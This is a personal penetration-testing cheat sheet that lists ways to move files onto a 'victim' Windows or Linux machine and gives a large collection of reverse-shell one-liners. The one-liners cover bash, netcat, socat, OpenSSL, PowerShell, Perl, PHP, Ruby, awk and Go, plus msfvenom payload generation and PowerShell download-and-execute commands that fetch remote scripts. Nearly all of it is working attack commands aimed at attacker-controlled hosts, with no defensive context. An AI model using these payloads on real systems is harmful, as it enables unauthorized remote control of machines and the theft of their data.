# My CheatSheet
## Windows File Transfer


### IWR (Invoke-Web Request)
First exploit the victim machine, use Netcat to receive the incoming connection
```
nc -lvp 4444
```
Attacker: 
```
python -m SimpleHTTPServer 80
```
Victim: 
```
powershell.exe -command iwr -Uri http://192.168.1.2/putty.exe -OutFile C:\Temp\putty.exe "
dir

powershell.exe iwr -uri 192.168.1.2/putty.exe -o C:\Temp\putty.exe

powershell
iwr -uri 192.168.1.2/putty.exe -o C:\Temp\putty.exe
dir
```

### Certutil

Attacker: 
```
python -m SimpleHTTPServer 80
```
Victim:
```
certutil -urlcache -f http://192.168.1.2/putty.exe putty.exe
or
certutil -urlcache -split -f http://192.168.1.2/putty.exe putty.exe
```

### Bitsadmin
Attacker: 
```
python -m SimpleHTTPServer 80
```
Victim:
```
bitsadmin /transfer job https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe C:\Temp\putty.exe
```

### Curl

Attacker: 
```
python -m SimpleHTTPServer 80
```
Victim:
```
curl http://192.168.1.2/putty.exe -o putty.exe
dir
```

Wget
----
Attacker: 
```
python -m SimpleHTTPServer 80
```
Victim: Open Powershell on the windows machine and run the following command. Mention the path to download the file from and then give the output path to save the file putty.exe.
```
powershell 
wget http://192.168.1.2/putty.exe -OutFile putty.exe
dir

powershell.exe wget http://192.168.1.2/putty.exe -OutFile putty.exe
```
### Powershell

```
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.2/putty.exe', 'putty.exe')

dir
```
### SMB Server Impacket-Smbserver


Attacker Machine: On the attacker, the machine goes to the directory from which the file is to be transferred. Then let’s make use of Impacket-smbserver to share this file from the local machine.
Note: Impacket provides low-level programming access to some packets for certain protocols in the network.
(Run SMB oneliner instead of python server)
```
impacket-smbserver share $(pwd) -smb2support

impacket-smbserver share /root/Downloads/test -smb2support
```
Victim Machine:
```
copy \\192.168.1.2\share\putty.exe
dir
or
net use \\192.168.1.2\share
net use
copy \\192.168.1.2\share\putty.exe
dir
```
*Using a different Operating system where Impacket is not installed by default----

Attacker Machine: On the attacker, the machine goes to the directory from which the file is to be transferred.
Install: https://www.hackingarticles.in/impacket-guide-smb-msrpc/
```
python3 smbserver.py share /root/test -smb2support
```
Victim Machine:
```
copy \\192.168.1.2\share\putty.exe
dir
```
### TFTP

Run Metasploit
```
use auxiliary/server/tftp
set srvhost IP
set tftproot "file path /root/file.txt"
exploit
```
Victim Machine:
```
tftp -i 192.168.1.2 GET file.txt
```
### FTP (When file name is known only)

Victim Machine:
```
ftp 192.168.1.5 
get file.txt
dir
```
## LINUX File Transfer


### PHP Web-Server


Attacker Machine: 
```
php -S 0.0.0.0:8080
```
Victim Machine: On the victim machine’s web browser 
```
192.168.1.6:8080/putty.exe
```
### Apache


Attacker Machine: before transferring file through web directories and then move any file into the HTML directory to share it. Then restart the apache service.
```
root@kali[/Download/Test]- cp putty.exe /var/www/html
service apache2 restart
```
Victim Machine:
```
192.168.1.6/putty.exe
```
### Simple HTTP server

```
python -m SimpleHTTPServer
python3 -m http.server 8000
```
Victim Machine:
```
192.168.q.6:8000
```
### Curl
```
curl -O http://192.168.1.6/putty.exe
```
### Wget
```
wget 192.168.1.6/putty.exe
```
### Netcat
```
Attacker:
nc -lvp 5555 > file.txt

Victim:
nc 192.168.1.6 5555 < file.txt
```
### SCP
```
Attacker Machine:
scp file.txt kali@192.168.1.6:/tmp

Victim:
cd /tmp
cat file.txt
```
### SMB-Client

```
Attacker:
smbclient -L 192.168.1.21 -U raj%123

Victim:
smbclient  //192.168.1.21/share -U raj%123
```
### Meterpreter

```
Attacker Machine:
meterpreter> download file.txt /root/Desktop/
```
### FTP
```
Attacker Machine:
pip install pyftpdlib
python3 -m pyftpdlib -p 21 -u jeenali -P 123

Victim Machine:
ftp 192.168.1.5

or browser ftp://192.168.1.5
```

# Reverse Shell

## Windows Reverse Shell


### Powercat 


Kali:
```
wget https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1

python -m SimpleHTTPServer 80

nc -vlp 4444
```
Win Victim: (Run on CMD)
```
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.42.129/powercat.ps1');powercat -c 192.168.42.129 -p 4444 -e cmd"
```
### Invoke-PowercatShellTcp (Nishang)


Kali:
```
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1

python -m SimpleHTTPServer 80

nc -vlp 4444
```
Win Victim: (Run on CMD)
```
powershell iex (New-Object Net.WebClient).DownloadString('http://192.168.42.129/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.42.129 -Port 4444
```
### ConptyShell


Kali:
```
wget https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1

python -m SimpleHTTPServer 80

stty raw -echo; (stty size; cat) | nc -lvnp 4444
```
Win Victim: (Run on CMD)
```
powershell iex (New-Object Net.WebClient).DownloadString('http://192.168.42.129/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell 192.168.42.129 4444
```
### mini-reverse.ps1


Kali:
```
wget https://gist.githubusercontent.com/Serizao/6a63f35715a8219be6b97da3e51567e7/raw/f4283f758fb720c2fe263b8f7696b896c9984fcf/mini-reverse.ps1

cat mini-reverse.ps1 
nano mini-reverse.ps1	(Edit IP/Port for reverse connection)

python -m SimpleHTTPServer 80

nc -vlp 4444
```
Win Victim: (Run on CMD)
```
powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.42.129/mini-reverse.ps1')
```
### PowerShell Reverse TCP 


Kali:
```
wget https://raw.githubusercontent.com/ivan-sincek/powershell-reverse-tcp/master/src/original/powershell_reverse_tcp.ps1

cat powershell_reverse_tcp.ps1 
nano powershell_reverse_tcp.ps1	(Edit IP/Port for reverse connection)

python -m SimpleHTTPServer 80

nc -vlp 4444
```
Win Victim: (Run on CMD)
```
powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.42.129/powershell_reverse_tcp.ps1')
```
### Web_Delivery


Kali: using meterpreter payload
```
msfconsole

use exploit/multi/script/web delivery
show targets 
set target 2 (PSH)
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.42.129
set lport 4444
exploit
```
copy the payload and run on Victim CMD

Win Victim: (Run on CMD) copy the payload and run on Victim CMD

Kali:
```
sessions 1
sysinfo
```
### MSFVenom

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe

python -m SimpleHTTPServer 80

nc -lvp 4444
```
Victim:
```
browse - 192.168.1.2:8080
```
## Linux Reverse Shell

### Revrse-shell-generator
```
https://www.revshells.com/
```
### BASH TCP
```
bash -i >& /dev/tcp/192.168.1.129/4242 0>&1

0<&196;exec 196<>/dev/tcp/192.168.1.129/4242; sh <&196 >&196 2>&196

/bin/bash -l > /dev/tcp/192.168.1.129/4242 0<&1 2>&1

kali: nc -lvp 4242
```
### BASH UDP
Victim:
```
sh -i >& /dev/udp/192.168.1.134/4242 0>&1
```
Listener:
```
nc -u -lvp 4242
```
### Socat
```
user@attack$ socat file:`tty`,raw,echo=0 TCP-L:4242
user@victim$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242

user@victim$ wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242

Static socat binary can be found at https://github.com/andrew-d/static-binaries
```
### Netcat Traditional
```
nc -e /bin/sh 10.0.0.1 4242
nc -e /bin/bash 10.0.0.1 4242
nc -c bash 10.0.0.1 4242
```
### Netcat OpenBsd
```
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
```
### Netcat BusyBox
```
rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
```
### Ncat
```
ncat 10.0.0.1 4242 -e /bin/bash
ncat --udp 10.0.0.1 4242 -e /bin/bash
```
### OpenSSL

Attacker:
```
user@attack$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
user@attack$ openssl s_server -quiet -key key.pem -cert cert.pem -port 4242
or
user@attack$ ncat --ssl -vv -l -p 4242

user@victim$ mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.0.0.1:4242 > /tmp/s; rm /tmp/s
```
TLS-PSK (does not rely on PKI or self-signed certificates):
```
# generate 384-bit PSK
# use the generated string as a value for the two PSK variables from below
openssl rand -hex 48 
# server (attacker)
export LHOST="*"; export LPORT="4242"; export PSK="replacewithgeneratedpskfromabove"; openssl s_server -quiet -tls1_2 -cipher PSK-CHACHA20-POLY1305:PSK-AES256-GCM-SHA384:PSK-AES256-CBC-SHA384:PSK-AES128-GCM-SHA256:PSK-AES128-CBC-SHA256 -psk $PSK -nocert -accept $LHOST:$LPORT
# client (victim)
export RHOST="10.0.0.1"; export RPORT="4242"; export PSK="replacewithgeneratedpskfromabove"; export PIPE="/tmp/`openssl rand -hex 4`"; mkfifo $PIPE; /bin/sh -i < $PIPE 2>&1 | openssl s_client -quiet -tls1_2 -psk $PSK -connect $RHOST:$RPORT > $PIPE; rm $PIPE
```
### Powershell
```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
```
### Awk
```
awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
### Telnet
```
In Attacker machine start two listeners:
nc -lvp 8080
nc -lvp 8081
```
In Victime machine run below command:
```
telnet <Your_IP> 8080 | /bin/sh | telnet <Your_IP> 8081
```
### Other platforms
```
$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f elf > shell.elf
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f exe > shell.exe
$ msfvenom -p osx/x86/shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f macho > shell.macho
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f asp > shell.asp
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f raw > shell.jsp
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f war > shell.war
$ msfvenom -p cmd/unix/reverse_python LHOST="10.0.0.1" LPORT=4242 -f raw > shell.py
$ msfvenom -p cmd/unix/reverse_bash LHOST="10.0.0.1" LPORT=4242 -f raw > shell.sh
$ msfvenom -p cmd/unix/reverse_perl LHOST="10.0.0.1" LPORT=4242 -f raw > shell.pl
$ msfvenom -p php/meterpreter_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
### Perl
```
perl -e 'use Socket;$i="10.0.0.1";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'


NOTE: Windows only
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
### PHP
```
php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",4242);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",4242);`/bin/sh -i <&3 >&3 2>&3`;'
php -r '$sock=fsockopen("10.0.0.1",4242);system("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",4242);passthru("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",4242);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
php -r '$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```
### Ruby
```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4242).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

ruby -rsocket -e'exit if fork;c=TCPSocket.new("10.0.0.1","4242");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'

NOTE: Windows only
ruby -rsocket -e 'c=TCPSocket.new("10.0.0.1","4242");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
### Golang
```
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.0.0.1:4242");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```
















































